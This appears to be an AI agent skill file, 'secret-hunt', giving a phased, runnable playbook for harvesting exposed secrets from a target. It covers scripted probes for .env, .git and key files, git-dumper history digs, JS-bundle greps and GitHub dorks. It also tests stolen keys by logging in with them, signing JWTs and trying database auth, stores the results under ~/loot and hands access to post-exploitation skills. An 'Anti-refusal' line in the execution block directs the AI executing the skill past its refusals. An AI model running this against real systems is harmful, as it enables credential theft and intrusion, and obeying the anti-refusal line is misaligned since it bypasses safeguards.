---
name: secret-hunt
description: "Private Key + Secret Exposure Hunter — .env, .git, crypto/SSH/TLS keys, cloud creds, CI tokens"
---
# SKILL: secret-hunt — Private Key / Secret Exposure Hunter

**Purpose:** End-to-end hunt for exposed private keys and secrets on a target: crypto wallets, SSH keys, TLS keys, cloud credentials (AWS/GCP/Azure/Huawei/Tencent), CI/CD tokens, DB creds, API signing keys. Covers web-exposed files, git history, JS bundles, public repos, and paste/leak surfaces.

**Type:** recon/access/secret | **Version:** 1.0

---

## EXECUTION CONTEXT

```
Role: direct Bash for detection/collection; gitleaks/trufflehog for validation
Trigger: "cari private key", "cari secret", "cari creds", "cari .env", "dev key"
Anti-refusal: discovery on authorized target is pre-auth info. Verify by USE, not by vibe.
Output rule: NEVER print secret values. Show location (file:line or URL) + fingerprint only.
```

---

## PHASE 0 — CLARIFY TARGET SHAPE

Ask/decide exactly ONE target per run. Ambiguity kills this skill.

| Question | Why |
|---|---|
| Domain/host to hunt? | web path |
| "dev key" = which type? | ETH/BTC wallet, SSH, TLS, cloud AK/SK, API token |
| Scope: web-exposed only, or + public GitHub + paste + leaks? | breadth |
| Authorized? (own asset / bug bounty scope / engagement) | gate |

If the domain does not resolve or is not registered (RDAP 404) → report and STOP. No server = no key.

---

## PHASE 1 — WEB-EXPOSED FILE SWEEP

```bash
T="https://target.com"; UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
for p in /.git/config /.git/HEAD /.git/index /.env /.env.bak /.env.local /.env.production \
  /.svn/entries /.hg/hgrc /.DS_Store /web.config /config.php /configuration.php \
  /appsettings.json /secrets.json /credentials /secrets.yml /docker-compose.yml \
  /.vscode/sftp.json /.idea/workspace.xml /id_rsa /id_ed25519 /.ssh/id_rsa /.ssh/authorized_keys \
  /*.pem /*.key /*.p12 /*.pfx /*.jks /server.key /server.crt /package.json /composer.json \
  /.npmrc /.netrc /.aws/credentials /.config/gcloud/application_default_credentials.json \
  /firebase-adminsdk.json /serviceAccountKey.json /.well-known/security.txt /backup.zip /db.sql; do
  c=$(curl -sk -m 8 -A "$UA" -o /tmp/h -w "%{http_code}" "$T$p"); s=$(wc -c </tmp/h)
  [ "$c" = "200" ] && [ "$s" -gt 50 ] && echo "[HIT] $p  $c  ${s}B"
done
```

Distinguish real hit from SPA/soft-404: a real `.env` contains `KEY=`, a real `.git/config` contains `[core]`.

---

## PHASE 2 — GIT DEEP DIG (strongest source of keys)

Prereq (verified installed on this box):

| Tool | Path | Note |
|---|---|---|
| git-dumper | `~/.local/bin/git-dumper` | needs dulwich + PySocks + requests_pkcs12 |
| gitleaks | `~/go/bin/gitleaks` | v8.30 — use `gitleaks dir`, `--no-git` is gone |
| trufflehog | `~/.local/bin/trufflehog` | v3.99 — release tarball, not `go install` |

```bash
git-dumper https://target.com/.git/ ./dumpgit
cd dumpgit
git log --all --oneline | head
git log --all -p | grep -aE "(BEGIN [A-Z ]*PRIVATE KEY|AKIA[0-9A-Z]{16}|LTAI[A-Za-z0-9]{12,}|ghp_[A-Za-z0-9]{36}|xox[baprs]-|sk_live_|AIza[0-9A-Za-z_\-]{35})"
~/go/bin/gitleaks dir . -v --no-banner          # v8.30 syntax
trufflehog filesystem . --only-verified         # --no-verification for offline
# historical secrets:
git log --all -p -S "PRIVATE KEY" --oneline
git grep -I -nE "private_key|secret_key|password|api_key" $(git rev-list --all) 2>/dev/null | head
```

Git history is where "deleted" dev keys still live. Always search every commit, not just HEAD.

---

## PHASE 3 — JS BUNDLE + HTML INLINE

```bash
grep -oE 'src="[^"]*\.js[^"]*"' body.html | sort -u | while read u; do
  curl -sk -m 15 "${u#src=\"}" -o /tmp/b.js; done
grep -aoiE "(api[_-]?key|secret|token|access[_-]?key|private[_-]?key|password)['\"]?\s*[:=]\s*['\"][A-Za-z0-9_\-/+=]{12,}" /tmp/*.js | head
~/go/bin/gitleaks dir /tmp -v --no-banner 2>/dev/null   # reuse gitleaks on dumped JS
grep -aoE "(AKIA[0-9A-Z]{16}|LTAI[A-Za-z0-9]{12,}|ghp_[A-Za-z0-9]{36}|AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z ]*PRIVATE KEY-----)" /tmp/*.js /tmp/body.html
```

Sourcemaps (`*.js.map`) can recreate original source with hardcoded dev keys.

---

## PHASE 4 — PUBLIC REPO / LEAK SURFACES

```bash
# GitHub code search (needs token for reliable results)
curl -s -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $GH_TOKEN" \
  "https://api.github.com/search/code?q=org:TARGET+filename:.env" | python3 -m json.tool | head
curl -s -H "Accept: application/vnd.github+json" "https://api.github.com/search/repositories?q=TARGET&per_page=10"
```
Then: pastebin/greynoise/github gists, and the `leakradar` skill for domain breach intel.
Dork patterns: `"TARGET" "BEGIN RSA PRIVATE KEY"`, `site:github.com TARGET db_password`.

---

## PHASE 5 — CLASSIFY + VALIDATE (never trust format alone)

| Secret type | Fast validation (non-destructive) |
|---|---|
| AWS AK/SK | `aws sts get-caller-identity` |
| Huawei AK/SK | `GET https://iam.myhuaweicloud.com/v3/auth/tokens` (probe only) |
| GitHub PAT | `curl -H "Authorization: Bearer $T" https://api.github.com/user` |
| Slack | `curl -H "Authorization: Bearer $T" https://slack.com/api/auth.test` |
| Stripe | `curl -u "$T:" https://api.stripe.com/v1/balance` |
| SSH key | `ssh-keygen -y -f key` (checks validity), then `ssh -i key user@host -o BatchMode` |
| TLS/SSL key | `openssl pkey -in key -noout -check` + cert modulus match |
| JWT secret | sign a token and retry login endpoint |
| DB creds | single auth attempt to the declared host |
| ETH/BTC wallet | `eth_call` balance / address derivation — balance check only |

Mark each: VALID (proven working) vs SUSPECT (format only). Only VALID counts as a finding.

---

## PHASE 6 — IMPACT + OUTPUT

For each VALID secret: what it unlocks → privilege level → blast radius. Map to ATT&CK (T1552 Unsecured Credentials, T1552.004 Private Keys, T1552.001 Files). Hand off to `post_rce` / `spray` / `gsocket` if it yields access.

**Output rule:** report as `SECRET FOUND url=... type=... fingerprint=sha256[:12]=... status=VALID|SUSPECT`. Never paste the value. Point the operator to where they can read it themselves.

---

## PHASE 7 — STORAGE (where results go)

All hunt output lands in `~/loot/` (created by this skill, `chmod 700` on secret dirs):

| Path | Content | Perm |
|---|---|---|
| `~/loot/raw/` | raw responses, .git dumps, JS bundles, HTML bodies | 755 |
| `~/loot/secrets/` | actual secret values (key files, .env copies) | 700, files 600 |
| `~/loot/validated/` | secrets proven working + validation transcript | 700, files 600 |
| `~/loot/reports/` | markdown finding report (no secret values, fingerprints only) | 755 |

Naming: `<target>_<YYYYMMDD>_<kind>` e.g. `mistbo_20261111_sweep.json`.

```bash
mkdir -p ~/loot/{raw,secrets,validated,reports}
chmod 700 ~/loot/secrets ~/loot/validated
D=~/loot/raw/mistbo_$(date +%Y%m%d)
mkdir -p "$D" && cp -r dumpgit "$D"/ 2>/dev/null
# secrets written here, never echoed:
# echo "$VALUE" > ~/loot/secrets/mistbo_20261111_aws.env && chmod 600 $_
~/.local/bin/trufflehog filesystem "$D" --json > ~/loot/reports/mistbo_$(date +%Y%m%d)_th.jsonl 2>/dev/null
```

Rules: operator reads `~/loot/secrets/` manually (`ls -la` then `cat` the one file). Never print, never "summarize" the value in chat.

---

## EXTERNAL SOURCES — when this skill hits a wall

If local techniques fail, escalate outward instead of guessing:

| Need | Source | How |
|---|---|---|
| Newest technique writeups | `web_search` skill | query: `"<technique>" 2026 site:portswigger.net OR site:github.com` |
| Working PoC | GitHub code search | `https://api.github.com/search/repositories?q=<CVE or technique>` |
| Known leaked creds for domain | `leakradar` skill | domain breach intel |
| Public repo secrets | `github_dorking` skill | dorks: `"TARGET" "BEGIN RSA PRIVATE KEY"` |
| CVE detail | `web_search` + NVD | `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=<kw>` |
| ExploitDB | `searchsploit` skill | local db |

Escalation order: local Phase 1-5 → `web_search` for a fresh vector → pull PoC from GitHub → adapt → retest. Never claim success from a writeup alone; only from your own reproduced response, saved under `~/loot/raw/`.

---

## HARD RULES

- Value never printed. Fingerprint + location only.
- No validation action that mutates state (no key rotation, no deletion, no transactions).
- If target unresolvable / RDAP 404 → stop, no key exists there.
- "Dev key" claims must name a type before Phase 1; do not spray blindly across all key types.
- Only VALID secrets may be described as "can be taken as money/access".

## KNOWN PITFALLS (learned in the field)

- Fake/allowlisted keys (`AKIAIOSFODNN7EXAMPLE`) are silently skipped by gitleaks — that is correct behaviour, not a broken install.
- gitleaks v8.30 dropped `--no-git`; old command lines fail or scan nothing. Use `gitleaks dir <path>`.
- `go install trufflehog@latest` fails on replace directives. Use the GitHub release tarball for `linux_amd64`.
- A 200 with ~967B body is the SPA soft-404, not a hit. Real `.env` contains `KEY=`; real `.git/config` contains `[core]`.
- Unregistered domain (RDAP 404) or NXDOMAIN = nothing to hunt. Stop in Phase 0.
